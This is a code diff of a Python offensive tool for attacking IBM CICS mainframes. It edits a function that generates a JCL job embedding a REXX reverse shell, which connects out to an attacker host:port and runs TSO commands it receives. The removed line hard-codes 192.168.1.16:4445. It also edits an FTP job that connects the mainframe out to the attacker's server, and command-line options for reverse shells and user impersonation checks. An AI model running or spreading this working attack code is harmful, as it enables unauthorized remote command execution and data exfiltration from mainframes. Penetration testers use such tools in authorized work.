@@ -872,18 +872,16 @@ def reverse_jcl(lhost, username="CICSUSEB"):
 //           DISP=(NEW,CATLG,DELETE),SPACE=(TRK,5),
 //           DCB=(RECFM=FB,LRECL=80,BLKSIZE=27920)
 //SYSUT1     DD *
-  /* REXX */ nl ='25'x;reverse('192.168.1.16','4445');exit
- reverse:
- PARSE ARG rh,  rp
+ /* REXX */rh='"""+lhost.split(":")[0]+"""';rp='"""+lhost.split(":")[1]+"""';nl ='25'x;
     t=SOCKET('INITIALIZE','CLIENT',2);t=SOCKET('SOCKET',2,'STREAM','TCP');
     parse var t socket_rc s . ; if socket_rc <> 0 then do
        t= SOCKET('TERMINATE');exit 1;end
        par1='SOL_SOCKET';t=Socket('SETSOCKOPT',s,par1,'SO_KEEPALIVE','ON')
     t=SOCKET('SETSOCKOPT',s,par1,'SO_ASCII','On')
     t=SOCKET('SOCKETSETSTATUS','CLIENT');
-    t=SOCKET('CONNECT',s,'AF_INET' rp rh); t= SOCKET('SEND',s, 'TSO> ')
-  DO FOREVER
-    g_cmd = get_cmd(s);parse = exec_cmd(s,g_cmd);end;return 0
+    t=SOCKET('CONNECT',s,'AF_INET' rp rh); t= SOCKET('SEND',s, 'Shell> ')
+  DO until i=3
+    g_cmd = get_cmd(s);parse = exec_cmd(s,g_cmd);i=i+1;end;exit
  get_cmd:
     parse arg socket_to_use; sox = SOCKET('RECV',socket_to_use,10000);
     parse var sox s_rc s_data_len s_data_text;
@@ -898,8 +896,10 @@ def reverse_jcl(lhost, username="CICSUSEB"):
    u = OUTTRAP(OFF);DO i = 1 to tso_out.0
       text = text||tso_out.i||nl;end;return text
  exec_cmd:
- parse arg sockID, do_it;t=SOCKET('SEND',sockID, exec_tso(do_it)||nl);
- te = SOCKET('SEND',sockID, 'Tso> ');return 1;
+ parse arg sockID, do_it; parse var do_it do_it do_co
+ if translate(do_it) = 'TSO' THEN do
+   t=SOCKET('SEND',sockID, exec_tso(do_co)||nl);end
+ te = SOCKET('SEND',sockID, 'Shell> ');return 1;
 /*
 //SYSOUT     DD SYSOUT=*
 //STEP01 EXEC  PGM=IKJEFT01
@@ -910,6 +910,7 @@ def reverse_jcl(lhost, username="CICSUSEB"):
 //SYSIN    DD  DUMMY
 /*EOF
 """
+  
   return jcl_code
 
 def ftp_jcl(lhost):
@@ -917,6 +918,7 @@ def ftp_jcl(lhost):
      JOB that initiates an FTP connection from the mainframe to your FTP server
      
   """
+  cmds = ""
   if not results.ftp_cmds:
       whine('Please point towards a valid ftp file containing commands to send','err');
       sys.exit();
@@ -926,8 +928,9 @@ def ftp_jcl(lhost):
       sys.exit();
   
   whine('Reading FTP commands from '+results.ftp_cmds,'info')
-  cmds = cmds_file.readlines();
-  cmds = ' '+' '.join(cmds)
+  for line in cmds_file:
+     if line.find("#") != 0:
+        cmds +=" "+line
   
   job_name = 'FTPCICS'
   tmp = rand_name(randrange(3,7))  	
@@ -1508,7 +1511,7 @@ if __name__ == "__main__" :
     parser.add_argument('-g','--surrogat',help='Checks wether you can impersonate another user when submitting a job', default=False,dest='surrogat_user')
     parser.add_argument('-s','--submit',help='Submit JCL to CICS server. Specify: dummy,reverse,custom (need -j option),cicsshell,ftp',dest='submit')
     parser.add_argument('--queue',help='Provides the name of the TD queue to submit a JOB',dest='queue')
-    parser.add_argument('--ftp-cmds',help='List of ftp commands to execute',dest='ftp_cmds')
+    parser.add_argument('--ftp-cmds',help='Files containig a list of ftp commands to execute',dest='ftp_cmds')
     parser.add_argument('--node',help='System node name where the JOB should be submitted (works only with Spool functions)',dest='node')
 
     parser.add_argument('-l','--lhost',help='Remote server to call back to for reverse shell (host:port)',dest='lhost')
